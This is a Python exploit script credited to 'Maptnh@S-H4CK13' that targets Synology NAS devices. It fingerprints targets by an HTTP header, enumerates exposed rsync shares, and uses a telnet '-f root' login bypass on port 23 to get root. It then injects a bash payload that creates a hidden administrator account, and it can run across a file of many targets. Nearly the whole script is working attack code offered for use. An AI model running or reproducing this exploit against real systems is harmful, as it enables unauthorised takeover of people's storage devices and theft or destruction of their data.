# Synology NAS Exploit | Secret Exploit
# Maptnh@S-H4CK13
import argparse
from urllib.parse import urlparse
import requests
import sys
import socket
import datetime
import pexpect
import os
import pexpect
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

LOGO = f'''
      |________|___________________|_
      |        |\033[31;102m | | | | | | | | | | \033[0m|________________
      |________|___________________|_|                ,
      |        |                   |                  ,
Maptnh@S-H4CK13 | Synology Nas Vuln Exploit | https://github.com/MartinxMax/'''

class LogInfo: 
    def __init__(self):
        self.RESET = "\033[0m"
        self.RED = "\033[91m"      
        self.GREEN = "\033[92m"   
        self.YELLOW = "\033[93m"    
        self.BLUE = "\033[94m"     
        self.BOLD = "\033[1m"    
    def _get_timestamp(self):
        return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    def success(self, msg):
        timestamp = self._get_timestamp()
        print(f"{self.GREEN}[+] {timestamp} - {msg}{self.RESET}")

    def warning(self, msg):
        timestamp = self._get_timestamp()
        print(f"{self.YELLOW}[!] {timestamp} - {msg}{self.RESET}")

    def error(self, msg):
        timestamp = self._get_timestamp()
        print(f"{self.RED}[-] {timestamp}  {msg}{self.RESET}")

    def info(self, msg):
        timestamp = self._get_timestamp()
        print(f"{self.BLUE}[*] {timestamp} - {msg}{self.RESET}")

 
log = LogInfo()



def send_rsync_request(target_ip, port=873, timeout=10):
    def print_rsync_modules(shares, target_ip):
        print("=" * 60)
        print(f"{'MODULE':<25}")
        print("-" * 60)
        for i, s in enumerate(shares, 1):
            print(f"{s['name']:<25} {s['comment']}")

    log.info(f"[{target_ip}] Attempting to retrieve rsync exposed information...")
    rsync_handshake = b"@RSYNCD: 31.0\n#list\n"
    response_data = b""

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((target_ip, port))
            s.sendall(rsync_handshake)

            while True:
                data = s.recv(1024)
                if not data:
                    break
                response_data += data

        response_str = response_data.decode("utf-8", errors="ignore").strip()
        share_list = []

        for line in response_str.splitlines():
            line = line.strip()
            if not line or line.startswith(("@RSYNCD:", "@ERROR:")) or line == "#listend":
                continue

            if "\t" in line:
                name, comment = line.split("\t", 1)
            else:
                name, comment = line, ""

            share_list.append({
                "name": name.strip(),
                "comment": comment.strip()
            })

        if share_list:
            log.warning(f"[{target_ip}] rsync information successfully retrieved")
            print_rsync_modules(share_list, target_ip)
        else:
            log.warning(f"[{target_ip}] No sensitive information detected")

        return True

    except socket.timeout:
        log.warning(f"[{target_ip}] rsync connection timed out")
        return False

    except ConnectionRefusedError:
        log.warning(f"[{target_ip}] rsync connection refused")
        return False

    except Exception:
        log.error(f"[{target_ip}] Unknown rsync error")
        return False



def check_nas_fingerprint(url):
    log.info(f"[{url}] Identifying NAS fingerprint...")
    TARGET_P3P = 'CP="IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT"'
    TARGET_CONNECTION = 'close'

    try:
        response = requests.get(
            url,
            timeout=10,
            verify=False,
            allow_redirects=False
        )
        p3p_header = response.headers.get('P3p', '').strip()
        if p3p_header == TARGET_P3P:
            log.success(f"[{url}] NAS device fingerprint matched")
            return True
        else:
            log.error(f"[{url}] NAS fingerprint not detected")
            return False

    except Exception:
        log.warning(f"[{url}] Target unreachable")
        return False



def check_port_open(host, port=23, timeout=5):
    log.info(f"[{host}] Checking exploit prerequisites...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()

        if result == 0:
            log.success(f"[{host}] Potential exploitation condition detected")
            return True

        log.warning(f"[{host}] Exploitation condition not met")
        return False

    except Exception:
        log.warning(f"[{host}] Exploitation condition not met")
        return False


def extract_host_from_url(url):
    from urllib.parse import urlparse
    parsed_url = urlparse(url)
    host_port = parsed_url.netloc or parsed_url.path
    host = host_port.split(':')[0]
    return host.strip()

def exploit(username,password,target,EXP_TIMEOUT=10):
    
    PAYLOAD_TEMPLATE = r'''
#!/bin/bash

TARGET_USER="@username"
TARGET_PASS="@password"
is_user_in_admin_group() {
    local admin_members=$(synogroup --get administrators | sed -n '/Group Members:/,$p' | grep -o '\[.*\]' | tr -d '[]' | tr '\n' ' ')
    echo "${admin_members}" | grep -qw "${TARGET_USER}"
}

if ! synouser --get "${TARGET_USER}" >/dev/null 2>&1; then
    echo "User ${TARGET_USER} does not exist, starting to create and add to administrators group..."
    synouser --add "${TARGET_USER}" "${TARGET_PASS}" "${TARGET_USER}" 0 "" ""
    synouser --modify "${TARGET_USER}" "Synology" 0 ""
    existing_members=$(synogroup --get administrators | sed -n '/Group Members:/,$p' | grep -o '\[.*\]' | tr -d '[]' | tr '\n' ' ')
    synogroup --member administrators ${existing_members}${TARGET_USER}
    echo "User ${TARGET_USER} created and added to the administrators group successfully!"
else
    if ! is_user_in_admin_group; then
        echo "User ${TARGET_USER} exists but is NOT in administrators group, adding now..."
        existing_members=$(synogroup --get administrators | sed -n '/Group Members:/,$p' | grep -o '\[.*\]' | tr -d '[]' | tr '\n' ' ')
        synogroup --member administrators ${existing_members}${TARGET_USER}
        echo "User ${TARGET_USER} added to administrators group successfully!"
    else
        : 
    fi
fi
'''
    PAYLOAD = PAYLOAD_TEMPLATE.replace("@username", username).replace("@password", password)
    ip =  target.split("://")[1].split(":")[0]
 
    child = None
    local_env = os.environ.copy()
    local_env["USER"] = "-f root"
    log.info(f"[{target}] Attempting to inject payload...")
    try:
        child = pexpect.spawn(
            f"/usr/bin/telnet -a {ip} 23",
            env=local_env,
            encoding="utf-8",
            logfile=None  
        )
        match_index = child.expect(
            [pexpect.EOF, pexpect.TIMEOUT, "#"],   
            timeout=EXP_TIMEOUT
        )
        
        if match_index == 2: 
            child.sendline(PAYLOAD)  
            child.expect([pexpect.EOF, pexpect.TIMEOUT], timeout=EXP_TIMEOUT)
            log.success(f"[{target}] [{username}:{password}] Superuser created successfully...")
        else:   
            log.error(f"[{target}] Exploit failed...")
 
    except Exception as e:
        log.error(f"[{target}] Exception occurred during exploit execution: {str(e)}")
    finally:
        if child is not None and not child.closed:
            child.close()
 

 
def parse_target(url: str):
    if not url.startswith(("http://", "https://")):
        raise ValueError("URL must start with http:// or https://")

    parsed = urlparse(url)
    scheme = parsed.scheme
    host = parsed.hostname

    if not host:
        raise ValueError("Invalid URL")

    port = parsed.port
    if not port:
        port = 80 if scheme == "http" else 443

    target_url = f"{scheme}://{host}:{port}"
    return host, port, target_url


def load_urls(args):
    targets = []

    if args.url:
        targets.append(args.url.strip())

    if args.urls:
        with open(args.urls, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    targets.append(line)

    return targets

def main():
    print(LOGO)
    parser = argparse.ArgumentParser(description="5yno1nc exploit runner")
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument("--url", help="Single target URL")
    target_group.add_argument("--urls", help="File containing target URLs")
    parser.add_argument("--username", help="Username for exploit", required=True)
    parser.add_argument("--password", help="Password for exploit", required=True)
    args = parser.parse_args()
    if not (args.username and args.password):
        parser.error("--username and --password must be specified together")
    targets = load_urls(args)
    for url in targets:
        print("-" * 100)
        try:
            host, port, target_url = parse_target(url)

            if not check_nas_fingerprint(target_url):
                continue

            send_rsync_request(host)

            if check_port_open(host, port=23):
                exploit(args.username, args.password, target_url)

        except Exception as e:
            print(f"[!] Error processing {url}: {e}")

if __name__ == "__main__":
    main()
 